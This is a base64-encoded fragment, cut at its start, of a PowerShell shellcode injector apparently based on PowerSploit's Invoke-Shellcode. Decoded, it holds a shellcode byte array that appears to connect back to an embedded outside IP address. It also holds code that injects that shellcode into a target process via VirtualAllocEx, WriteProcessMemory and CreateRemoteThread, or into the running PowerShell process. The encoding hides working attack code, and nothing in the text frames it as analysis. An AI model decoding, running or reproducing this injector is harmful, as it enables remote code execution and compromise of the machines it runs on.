sMHg2OCwweGI3LDB4NTcsMHhlMCwweDBiLDB4ZmYsMHhkNSwweGJmLDB4MDAsMHgyZiwweDAwLDB4MDAsMHgzOSwweGM3LDB4NzUsMHgwNCwweDg5LDB4ZDgsMHhlYiwweDhhLDB4MzEsMHhmZiwweGViLDB4MTUsMHhlYiwweDQ5LDB4ZTgsMHg4MSwweGZmLDB4ZmYsMHhmZiwweDJmLDB4NzksMHg3MSwweDVhLDB4NTgsMHgwMCwweDAwLDB4NjgsMHhmMCwweGI1LDB4YTIsMHg1NiwweGZmLDB4ZDUsMHg2YSwweDQwLDB4NjgsMHgwMCwweDEwLDB4MDAsMHgwMCwweDY4LDB4MDAsMHgwMCwweDQwLDB4MDAsMHg1NywweDY4LDB4NTgsMHhhNCwweDUzLDB4ZTUsMHhmZiwweGQ1LDB4OTMsMHg1MywweDUzLDB4ODksMHhlNywweDU3LDB4NjgsMHgwMCwweDIwLDB4MDAsMHgwMCwweDUzLDB4NTYsMHg2OCwweDEyLDB4OTYsMHg4OSwweGUyLDB4ZmYsMHhkNSwweDg1LDB4YzAsMHg3NCwweGNkLDB4OGIsMHgwNywweDAxLDB4YzMsMHg4NSwweGMwLDB4NzUsMHhlNSwweDU4LDB4YzMsMHhlOCwweDFkLDB4ZmYsMHhmZiwweGZmLDB4MzUsMHgzMiwweDJlLDB4MzQsMHgyZSwweDMzLDB4MzUsMHgyZSwweDM1LDB4MzksMHgwMAogICAgICAgICkKICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRAogICAgICAgICRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzCiAgICAgICAgJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkKICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6ICRQcm9jZXNzSWQiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbmplY3RpbmcgaW50byAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuUHJvY2Vzc05hbWUpICgkUHJvY2Vzc0lkKSEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LVJlbW90ZVNoZWxsY29kZSAkUHJvY2Vzc0lkCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MKICAgICAgICAkVmlydHVhbEFsbG9jQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jCiAgICAgICAgJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQogICAgICAgICRDcmVhdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0pIChbSW50XSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUG93ZXJTaGVsbCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgICAgICB9CiAgICB9CiAgICAKfQo=
